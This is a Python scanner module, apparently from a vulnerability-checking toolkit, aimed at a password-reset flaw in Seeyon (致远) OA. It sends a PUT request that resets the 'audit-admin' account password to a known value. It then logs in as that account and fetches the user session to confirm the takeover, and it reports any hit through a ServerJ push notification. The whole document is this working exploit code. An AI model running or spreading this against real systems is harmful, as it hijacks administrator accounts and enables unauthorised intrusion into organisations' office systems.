# 致远OA ucpcLogin密码重置漏洞
from Modules import ServerJ
from Common.Common_Request import common_request


def scan_Zhiyuan_OA_ucpclogin_pwd_reset(url, proxies, append_to_output, serverJ_key, bugName):
    path_put = "/seeyon/rest/orgMember/-4401606663639775639/password/share.do"
    headers_put = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Cookie': 'JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL='
    }

    path_post = "/seeyon/rest/authentication/ucpcLogin"
    headers_post = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    path_cookie = "/seeyon/rest/m3/login/getCurrentUser"
    # 定义请求体数据
    data_post = {
        'login_username': 'audit-admin',
        'login_password': 'share.do',
        'ticket': ''
    }

    data_cookie = '''{"":""}'''

    put_response = common_request(url, path=path_put, headers=headers_put, method='PUT', timeout=5, proxies=proxies,
                                     append_to_output=append_to_output)

    if put_response is not None:
        if put_response.status_code == 200:
            append_to_output(f"[+] {url} PUT请求成功！！！！", "yellow")

            post_response = common_request(url, path=path_post, headers=headers_post, method='post', data=data_post,
                                              timeout=5, proxies=proxies, append_to_output=append_to_output)
            if post_response is not None:
                if post_response.status_code == 200 and 'ok' in post_response.text and 'audit-admin' in post_response.text:
                    append_to_output(f"[+] {url} 存在致远OA ucpcLogin密码重置漏洞,需要拿COOKIE！！！！", "yellow")

                    post_response_cookie = common_request(url, path=path_cookie, headers=headers_post, method='post',
                                                             data=data_cookie, timeout=5, proxies=proxies,
                                                             append_to_output=append_to_output)
                    # 检查PUT请求响应
                    if post_response_cookie is not None:
                        if post_response_cookie.status_code == 200 and 'audit-admin' in post_response.text:
                            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
                        else:
                            append_to_output(f"[-] {url} 不存在{bugName}", "green")
                else:
                    append_to_output(f"[-] {url} 不存在{bugName}", "green")
        else:
            append_to_output(f"[-] {url} PUT请求未成功", "green")
